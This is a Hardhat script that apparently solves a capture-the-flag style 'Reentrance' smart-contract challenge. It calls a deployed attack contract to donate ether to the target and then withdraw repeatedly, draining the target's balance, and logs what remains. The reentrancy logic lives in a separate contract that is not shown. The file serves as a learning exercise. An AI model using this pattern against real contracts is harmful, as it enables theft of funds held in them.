const hre = require("hardhat");

async function main() {
    // Fetch account
    const [attacker] = await hre.ethers.getSigners();
    const INSTANCE_ADDRESS = "0x806f3E0Ee2633EdbeC4b83606dE38a6B3139bd3E";
    const ATTACKER_ADDRESS = "0x7d68A128D51fA6B18bfeC700EEdE79eeDA598B15";
    const AMOUNT = hre.ethers.utils.parseUnits('0.001', 'ether');

    // Fetch attack contract
    const reentrance = await hre.ethers.getContractAt("Reentrance", INSTANCE_ADDRESS);
    const reentranceAttack = await hre.ethers.getContractAt("ReentranceAttack", ATTACKER_ADDRESS);

    console.log(`Reentrance contract fetched at ${reentrance.address}\n`);
    console.log(`ReentranceAttack contract fetched at ${reentranceAttack.address}\n`);

    // Attack...
    let transaction = await reentranceAttack.connect(attacker).donateFunds({ value: AMOUNT });
    await transaction.wait();

    transaction = await reentranceAttack.connect(attacker).withdrawFunds();
    await transaction.wait();

    console.log(`Attack complete...\n`);

    const REENTRANCE_BALANCE = await hre.ethers.provider.getBalance(reentrance.address);
    console.log(`Reentrance Balance: ${REENTRANCE_BALANCE}\n`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});